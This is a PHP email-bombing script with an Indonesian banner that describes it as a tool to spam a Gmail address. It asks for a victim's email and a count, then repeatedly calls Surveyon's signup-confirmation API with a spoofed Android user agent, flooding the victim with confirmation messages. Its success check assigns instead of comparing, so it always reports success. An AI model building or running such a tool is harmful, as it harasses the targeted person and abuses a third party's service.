<?php
function gass($target, $jumlah) {
for ($i=1; $i <= $jumlah; $i++) {
$su = array("email" => "$target", "device_id" => "6bb443543d62ab32");
$gas = json_encode($su);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.surveyon.com/surveyon_api/mobile/v1_1/signup/confirmation_key");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $gas);
curl_setopt($ch, CURLOPT_USERAGENT, "surveyon/2.0.3 (Android: 6.0.1; MODEL:ASUS_X00AD; PRODUCT:WW_Phone; MANUFACTURER:asus;)");
$gas = curl_exec($ch);
curl_close($ch);
$respon = json_decode($gas);
if ($respon->code = 200) {
	echo $i .".Proses Sedang Menyepam Target...\n";
	}else{
		echo $i. ".GAGAL DI SPAM\n";
		}
     }
}

$banner = "
######################################
                      
╔════════════╗
╚════════════╝
 ║██████████╚╗
 ║██╔══╗█╔═╗█║
 ║██║╬╔╝█╚╗║█║
 ║██╚═╝█║█╚╝█
 ╚╗█████████═╝
  ╚╗║╠╩╩╩╩╩╝
   ║║       ╔════•ೋೋ•════╗
   ║║        TOOLS BUMJEV
   ║║       ╚════•ೋೋ•════╝
   ║║██╠╦╦╦╗
   ╚╗██████
       ╚══════
       [+]KEGUNAAN SCRIPT INI? UNTUK SPAM GMAIL!![+]
[+] PENULIS    [+] = [MR.ILMAN TERSAKITI]
[+] SUPPOT     [+] = [JEVIL /+\ ILMAN ID]
[+] YouTube    [+] = [LMAN ID]
[+] Team       [+] = [WOLF CYBER ATTACKER]
[+] Whatsapp   [+] = [0822-6244-4157]
[+] INSTAGRAM  [+] = [subcribeilmanid]
[+] FACEBOOK   [+] = [subcribeilman-id]
[+] NOTE       [+] = [MASUKAN GMAIL YANG BENAR!!!!!]
       [+]BANTU SUBCRIBE CHANEL SAYA [ILMAN ID][+]
######################################\n";
sleep(2);
echo $banner;
sleep(1);
echo "### masukan email target>>> : ";
$target = trim(fgets(STDIN));
sleep(1);
echo "### masukan jumlah >>>: ";
$jumlah =  trim(fgets(STDIN));
sleep(1);
echo "\n\nKALO GAGAL FIXS LUH BANYAK DOSA NYA :V :\n";
sleep(5);
echo "\n\nMOHON TUNGGU SEBENTAR ....:\n";
gass($target, $jumlah);

?>